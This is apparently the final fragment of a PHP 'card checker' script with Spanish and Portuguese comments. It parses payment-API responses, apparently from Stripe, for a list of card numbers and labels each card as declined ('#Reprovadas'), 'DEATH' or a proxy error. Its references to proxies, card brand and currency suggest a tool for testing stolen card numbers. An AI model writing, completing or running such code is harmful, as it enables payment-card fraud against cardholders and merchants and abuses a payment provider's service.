  <span class="badge badge-info"> Error interno</span> </br>';
}

elseif
  (strpos($tm2, 'Customer cus_JFfNoCDqZxcXv9 already has the maximum number of payment methods attached. (invalid_request_error)')) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> 😭DEATH😭 ⚰️</span> </br>';
}

elseif
  (strpos($tm2, '0')) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> Error de api</span> </br>';
}

elseif
  (strpos($tm2, 'invalid_request_error')) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> 😭DEATH😭 ⚰️</span> </br>';
}

 else {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> Proxy Dead / Error Not Listed</span></br>';
}

  // agregar respuestas sí ves necesario

curl_close($ch);
ob_flush();


///////////////////////////usar para ver respuestas/////////////////
///-------------------  quitar el "//" para poder ver las respuestas ------------------------
/// - '.$scheme.' - '.$brand.' - '.$currency.' 🔌💰
//echo $tm1; //<== REQ1
//echo $tm2; //<== REQ2
//echo $ip;
?>